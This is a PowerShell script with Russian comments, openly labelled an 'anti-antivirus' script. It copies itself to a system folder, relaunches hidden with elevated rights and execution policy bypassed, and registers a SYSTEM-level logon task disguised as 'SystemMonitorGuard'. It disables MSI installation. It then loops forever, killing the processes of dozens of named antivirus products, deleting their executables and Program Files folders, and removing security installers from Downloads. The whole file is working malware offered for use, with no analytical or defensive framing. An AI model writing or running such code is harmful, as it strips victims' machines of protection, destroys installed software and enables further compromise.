# === ПОЛНЫЙ ПУТЬ К СКРИПТУ ===
$taskScriptPath = "C:\System\monitor.ps1"

# === ЕСЛИ СКРИПТ ЗАПУЩЕН НЕ ИЗ C:\System, КОПИРУЕМ СЕБЯ ===
if ($MyInvocation.MyCommand.Path -ne $taskScriptPath) {
    New-Item -ItemType Directory -Path "C:\System" -Force | Out-Null
    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $taskScriptPath -Force
    Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$taskScriptPath`"" -Verb RunAs
    exit
}

# === СОЗДАНИЕ ЗАДАНИЯ ПЛАНИРОВЩИКА ===
$taskName = "SystemMonitorGuard"
if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
}

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$taskScriptPath`""
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force

# === ТВОЙ АНТИ-АНТИВИРУС СКРИПТ ===

$blockList = @(
    "msmpeng", "windefend", "securityhealthservice", "securitycenter", "windowsdefender", "mpcmdrun",
    "avast", "avastui", "avastsvc", "avg", "avgui", "avgsvc",
    "eset", "egui", "ekrn", "esets_proxy", "esets_service",
    "kaspersky", "avp", "klnagent", "ksnagent", "kasperskysecureconnection", "avpui",
    "bdagent", "vsserv", "updatesrv", "bdservicehost", "bdredline", "bdtl2", "bdreinit", "bdparental", "bdtools", "bdconsole", "bdwtxag",
    "ns", "nis", "nav", "norton", "nortonsecurity", "ccsvchst", "symantec", "symlcsvc", "smc", "smcgui", "rtvscan",
    "mcshield", "masvc", "mfemms", "mfewc", "mcafee", "frminst", "mcuihost", "mfefire", "mfetp",
    "sophos", "sophosui", "sophossps", "savservice", "sophosfs", "sophoshealth", "sophosclean", "sophosendpoint", "sophosweb", "scfservice", "scftray",
    "drweb", "drweb32w", "spiderml", "spidernt", "dwservice", "dwscanner",
    "comodo", "cmdagent", "cfp", "cavwp", "cis", "cistray", "cpf", "cmdvirth", "cmdinstall",
    "360tray", "360sd", "360ts", "qhactivedefense", "qhsafetray", "zhudongfangyu", "360rp", "360safe", "360rps",
    "baiduav", "bddataproxy", "baiduprotect", "baidu",
    "psanhost", "psuaservice", "apvxdwin", "webproxy", "psuamain",
    "fsgk32", "fssm32", "fsav32", "fsdfwd", "fsorsp", "fsaua", "fsav", "f-secure",
    "ufseagnt", "pccntmon", "tmlisten", "ntrtscan", "tmas", "tmbmsrv", "tmccsf", "tmccsrv", "tmbmnot", "tmntsrv", "tmevtmgr", "tmlwf",
    "zlclient", "zonealarm", "forcefield", "vsmon",
    "avkserv", "avkproxy", "avkcl", "gdata", "avkwctl",
    "mbam", "mbamtray", "mbamservice", "mbamgui", "mbampt",
    "adaware", "adawareantivirus", "adawareav", "adawarenotifier",
    "wrsa", "webroot", "wrsmon", "wrsnet", "wrskernel",
    "bullguard", "bgctl", "bgmain", "bgsvcgen", "bgshield", "bgproxy",
    "vipre", "sbamsvc", "sbamtray", "sbamui", "sbamcore",
    "qqpcmgr", "qqpctray", "qqpcnetflow", "tencent",
    "ravmond", "rav", "rsnetmon", "rsprotect", "rstray",
    "kismain", "kis", "ksafe", "kwatch",
    "clamav", "clamwin", "clamscan", "clamsvc",
    "cylance", "cyagent", "cytray", "cylanceui",
    "iptray", "sfc.exe", "immunet",
    "zillya", "zillyaantivirus", "zillyatray",
    "totalav", "pcprotect", "pctuneup", "pctservice",
    "antivirus", "antivir", "virusprotect", "antimalware"
)

$exeBlockList = @("setup", "installer", "install", "av", "antivirus", "360", "kaspersky", "eset", "avast", "malwarebytes", "security")
$downloads = "$env:USERPROFILE\Downloads"

# Блокировка установки MSI
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "DisableMSI" -Value 1

# Основной цикл
while ($true) {
    # Блокировка известных процессов
    foreach ($name in $blockList) {
        Get-Process | Where-Object { $_.Name -like "*$name*" } | Stop-Process -Force -ErrorAction SilentlyContinue
    }

    # WMI-обнаружение антивирусов
    $avProducts = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName "AntiVirusProduct" -ErrorAction SilentlyContinue
    foreach ($av in $avProducts) {
        $exePath = $av.pathToSignedProductExe
        if (Test-Path $exePath) {
            Stop-Process -Name (Split-Path $exePath -LeafBase) -Force -ErrorAction SilentlyContinue
            Remove-Item $exePath -Force -ErrorAction SilentlyContinue
        }
    }

    # Поиск в Program Files
    $programPaths = @("C:\Program Files\", "C:\Program Files (x86)\")
    foreach ($dir in $programPaths) {
        Get-ChildItem -Path $dir -Directory -ErrorAction SilentlyContinue | ForEach-Object {
            foreach ($kw in $exeBlockList) {
                if ($_.Name -like "*$kw*") {
                    try { Remove-Item -Recurse -Force $_.FullName -ErrorAction SilentlyContinue } catch {}
                }
            }
        }
    }

    # Блокировка установщиков в Downloads
    Get-ChildItem -Path $downloads -Filter *.exe -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
        foreach ($kw in $exeBlockList) {
            if ($_.Name -like "*$kw*") {
                try { Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue } catch {}
            }
        }
    }

    Start-Sleep -Seconds 3
}
